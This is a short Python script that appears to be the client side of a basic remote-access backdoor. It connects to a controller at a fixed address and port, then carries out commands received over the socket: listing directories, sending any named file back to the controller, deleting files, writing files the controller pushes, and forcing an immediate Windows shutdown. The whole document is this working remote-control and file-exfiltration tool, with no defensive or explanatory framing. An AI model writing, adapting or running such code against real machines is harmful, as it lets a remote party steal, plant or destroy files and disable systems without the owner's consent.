import os
import socket
import sys
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = '10.0.2.15'
port = 9999

s.connect((host, port))
print("")
print("Connected to the server successfully...")
print("")

#connections has been completed

#command receiving and execution

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("")
    print("Command received")
    print("")
    if command == "view_cwd":
        files = os.getcwd()
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed successfully...")
        print("")
    
    elif command == "custom_dir":
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        print("")
        print("Command has been executed successfully")
        print("")
        
    elif command == "download_file":
        file_path = s.recv(5000)
        file_path = file_path.decode()
        file = open(file_path, "rb")
        data = file.read()
        s.send(data)
        print("")
        print("File has been send successfully")
        print("")
       
    elif command == "remove_file":
        fileanddir = s.recv(6000)
        fileanddir = fileanddir.decode()
        os.remove(fileanddir)
        print("")
        print("Command has been executed successfully")
        print("")
        
    elif command == "send_file":
        filename = s.recv(6000)
        new_file = open(filename, "wb")
        data = s.recv(1000000000)     #Change when a file is big
        new_file.write(data)
        new_file.close()
        print("")
        print("Command has been executed successfully")
        print("")
        
    elif command == "shutdown":
        os.system("shutdown /s /f /t 0")
        
    elif command == "exit":
        sys.exit()
        
    else:
        print("")
        print("Command not recognized")